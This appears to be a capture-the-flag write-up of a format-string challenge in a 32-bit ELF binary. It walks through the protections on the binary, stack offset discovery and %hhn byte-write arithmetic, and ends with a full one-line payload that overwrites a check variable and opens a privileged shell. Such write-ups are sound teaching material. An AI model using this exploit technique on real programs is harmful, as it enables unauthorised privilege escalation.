## 1. Binary Specifications & Environmental Audit
Initial analysis of the target binary was performed to identify operational security controls and execution constraints.

### Mitigation Check (Checksec / Objdump):
* **Architecture:** ELF 32-bit LSB executable (Intel 80386).
* **Stack Canary:** `SSP enabled`. Stack-smashing protection is active, making standard stack buffer overflows non-viable.
* **NX (No-Execute):** `NX enabled`. The stack frame cannot execute injected shellcode.
* **PIE (Position Independent Executable):** `No PIE`. Virtual memory segments for code instructions remain static.
* **ASLR (Address Space Layout Randomization):** `OFF` (or non-disruptive here). The application explicitly prints the destination storage address at runtime, neutralizing any dynamic layout challenges.

---

## 2. Static Analysis & Source Code Review
The operational workflow of the application was audited using the provided C source code structure:

```c
int main( int argc, char ** argv ) {
    int var;
    int check  = 0x04030201;
    char fmt[128];
    ...
    printf( "check at 0x%x\n", &check );
    printf( "argv[1] = [%s]\n", argv[1] );

    snprintf( fmt, sizeof(fmt), argv[1] );

    if (check==0xdeadbeef) {
        printf("Yeah dude ! You win !\n");
        setreuid(geteuid(), geteuid());
        system("/bin/bash");
    }
}
```

### Vulnerability Identification:
The critical exploit vector lies within the parameter handling inside the bounded string function:

```c
snprintf( fmt, sizeof(fmt), argv[1] );
```

While `snprintf` limits structural buffer allocation leakage via `sizeof(fmt)` (preventing a standard stack smash), it directly accepts the user-controlled input parameter `argv[1]` as its **format string argument** instead of a static format specifier (e.g., `"%s"`). 

Because an operator can insert positional modifiers, this vulnerability facilitates an **Arbitrary Memory Write** via the `%n` family of format tokens, which write the total count of accumulated characters to a specified pointer target.

---

## 3. Stack Mapping & Offset Extraction
To determine the position of the input string on the stack frame, a pilot string layout was processed through the binary payload channel:

```bash
./ch14 "AAAA %x %x %x %x %x %x %x %x %x"
```

The resulting execution returned the hex representation of the string structure:
* The initial configuration sequence pinpointed the internal state of `check` (`0x04030201`) at position index **8**.
* The supplied `AAAA` control tag (`0x41414141`) appeared perfectly at position index **9**.

---

## 4. Exploitation Strategy & Payload Engineering

### Multi-Stage Byte Injection Strategy (`%hhn`):
To change the control variable from its starting state to the win-condition value `0xdeadbeef` without resource starvation or crash conditions, an inline multi-write process was configured. This technique uses the `%hhn` modifier to write to individual memory bytes, leveraging a cumulative modulo-256 wrapping technique.

Given the base target address printed by the application (e.g., `0xbffffac8`), four consecutive destination byte addresses were defined:
* **Byte 0 (`&check`)** : `0xbffffac8` $\rightarrow$ Target state value: `\xef` (239)
* **Byte 1 (`&check + 1`)** : `0xbffffac9` $\rightarrow$ Target state value: `\xbe` (190)
* **Byte 2 (`&check + 2`)** : `0xbffffaca` $\rightarrow$ Target state value: `\xad` (173)
* **Byte 3 (`&check + 3`)** : `0xbffffacb` $\rightarrow$ Target state value: `\xde` (222)

### Cumulative Character Count Calculations:
1. **Initial Vector (Index 9):** Four 32-bit base address sequences take up 16 bytes. To reach `239`, the padding requirement is: $239 - 16 = \mathbf{223}$.
2. **Second Vector (Index 10):** Target value is 190. Wrapping via modulo-256 dictates the next step at $256 + 190 = 446$. Required padding addition: $446 - 239 = \mathbf{207}$.
3. **Third Vector (Index 11):** Target value is 173. Wrapping calculation dictates next step at $512 + 173 = 685$. Required padding addition: $685 - 446 = \mathbf{239}$.
4. **Fourth Vector (Index 12):** Target value is 222. Wrapping calculation dictates next step at $512 + 222 = 734$. Required padding addition: $734 - 685 = \mathbf{49}$.

---

## 5. Execution & Shell Hijack
Since the binary processes input natively via initial command-line parameters (`argv`), the payload generation script was deployed inline using shell expansion syntax (`$(...)`) rather than an input pipe wrapper:

```bash
./ch14 "$(python -c "print('\xc8\xfa\xff\xbf' + '\xc9\xfa\xff\xbf' + '\xca\xfa\xff\xbf' + '\xcb\xfa\xff\xbf' + '%223x%9\$hhn' + '%207x%10\$hhn' + '%239x%11\$hhn' + '%49x%12\$hhn')")"
```

Upon execution, the format validation system successfully wrote to the memory coordinates of `check`, updating its value to `0xdeadbeef` and triggering the privilege escalation block to open a shell.

```text
Flag: REDACTED
```
